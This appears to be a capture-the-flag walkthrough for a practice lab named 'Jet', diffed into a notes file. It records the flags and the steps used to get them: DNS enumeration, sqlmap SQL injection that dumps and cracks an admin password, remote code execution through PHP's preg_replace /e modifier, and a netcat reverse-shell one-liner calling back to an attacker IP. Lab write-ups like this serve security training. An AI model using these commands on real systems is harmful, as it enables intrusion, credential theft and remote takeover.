@@ -1,0 +1,103 @@
+flags
+=====
+connect
+-------
+1)visit http://10.13.37.10
+
+flag: JET{s4n1ty_ch3ck}
+
+digging in
+----------
+//fortress jet used custom dns server so we need to specify it manually
+1)dig @10.13.37.10 -x 10.13.37.10
+/*
+@<ip> : specify dns server
+-x    : specify ip address
+
+37.13.10.in-addr.arpa.  604800  IN      SOA     www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800
+*/
+
+2)now need to specify the dns server in /etc/resolv.conf
+//nameserver 10.13.37.10
+/*
+now we can visit the websites since we had edited the resolv.conf to get the domain names from the dns server from fortress jet server
+*/
+
+3)visit www.securewebinc.jet and you got the flag
+
+flag: JET{w3lc0me_4nd_h@v3_fun!}
+
+going deeper
+------------
+1)use javascript console to execute the code convert the code to string
+//url: http://www.securewebinc.jet/js/secure.js
+
+//result
+$.ajax({url: \"/dirb_safe_dir_rf9EmcEIx/admin/stats.php\",
+
+2)visit the site: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/ and gotten login.php
+3)view source code of the page and gotten the flag.
+
+flag: JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}
+
+bypass authentication
+---------------------
+1) use sqlmap to get database db names
+//sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --dbs
+
+gotten interesting table: jetadmin
+
+2)use sqlmap to dump all info from jetadmin table
+//sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms -D jetadmin --dump-all
+
+result:
++----+------------------------------------------------------------------+----------+
+| id | password                                                         | username |
++----+------------------------------------------------------------------+----------+
+| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
++----+------------------------------------------------------------------+----------+
+
+3)crack the password hash using crackstation 
+hash 								      hash_type   password
+97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084	sha256	Hackthesystem200
+
+flag: JET{sQl_1nj3ct1ons_4r3_fun!} 
+
+command
+-------
+1)in dashboard.php there's sent email that are exploitable
+2)source code have vulgar words '/fuck/i' that will replace to 'make love' if 'fuck' detected in message
+//this is the preg_replace() function that takes place
+3)change the '/fuck/i' to '|fuck|e' in souce code
+  'make love' to any command that wanted to be RCE.
+//tested command
+phpinfo() //this will be shown in ../email.php message section
+system('whoami;id') //victim device details all shown
+/*take note:
+all these can be tried using burpsuite repeater function by changing the 'make love' value for RCE
+*/
+4)inject the reverse shell script to get reverse shell
+//system('rm /tmp/yyqq;mkfifo /tmp/yyqq;cat /tmp/yyqq|/bin/sh -i 2>&1|nc 10.13.14.18 18890 >/tmp/yyqq')
+/rmb to encode it to url
+
+flag: JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
+
+/*some tips:
+if site shows gateway timed out, delete all the cookies in storage>cookies, and relogin and grab a new PHPSSID and inject to repeater Cookies param. 
+*/
+overflown
+---------
+//found 'leak' file in /home dir
+
+
+secret message
+--------------
+//found tony bash_history
+/*
+www-data@jet:/home/tony$ cat .bash_history
+cat .bash_history 
+openssl rsautl -decrypt -inkey keys/private.key -in key.bin.enc -out key.bin
+openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt -pass file:./key.bin
+vi secret.txt
+...
+*/
